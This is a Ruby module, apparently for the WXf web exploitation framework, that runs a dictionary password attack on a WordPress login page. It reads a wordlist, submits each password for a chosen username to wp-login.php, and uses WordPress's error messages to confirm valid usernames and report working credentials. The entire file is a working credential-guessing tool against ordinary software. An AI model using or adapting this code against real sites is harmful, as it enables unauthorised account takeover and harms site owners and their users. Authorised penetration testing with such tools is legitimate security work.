#!/usr/bin/env ruby
# 
# Created Oct 10, 2012
#

class WebXploit < WXf::WXfmod_Factory::Auxiliary

 include WXf::WXfassists::General::MechReq
  
  def initialize
      super(
        'Name'        => 'Wordpress Password Enumeration',
        'Version'     => '1.0',
        'Description' => %q{
          Enumerate password for valid wordpress user		},
        'Author'      => ['John Poulin' ],
        'License'     => WXF_LICENSE

      )
   
      init_opts([
		OptString.new('USERNAME', [true, "Username to enumerate", "admin"]),
		OptString.new('VERBOSE', [false, "Show verbose output?", false]),
		OptString.new('DICT', [true, "Location of dictionary file", ""])
      ])
  
  end
  
  def run
	# Prepare file
	fname = datahash['DICT']
	file = File.new(fname, "r")
	uname = datahash['USERNAME']
	valid_user = false

	while pass = file.gets
		pass.chop!
		params = "log=#{uname}&pwd=#{pass}&wp-submit=Log+In&redirect_to=#{rurl + "/wp-admin"}&testcookie=1"
		res = mech_req({
            		'method' => "POST",
            		'RURL'=> rurl + "/wp-login.php",
            		'RPARAMS' => params,
			'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
         	})

		if ! valid_user
		   valid_user = valid_user? res
		   if ! valid_user
			print_error("#{uname} is not a valid username")
			break
		   end
		end

		if valid_pass? res
			print_good ("Valid Login: #{uname}:#{pass}")
		elsif datahash['VERBOSE']
			print_error ("Invalid Login: #{uname}:#{pass}")
		end	
	end
  end

  def valid_pass? (r)
	return true unless r.body.include?("The password you entered")
  end

  def valid_user? (r)
	return true unless r.body.include?("Invalid username")
  end
  
end
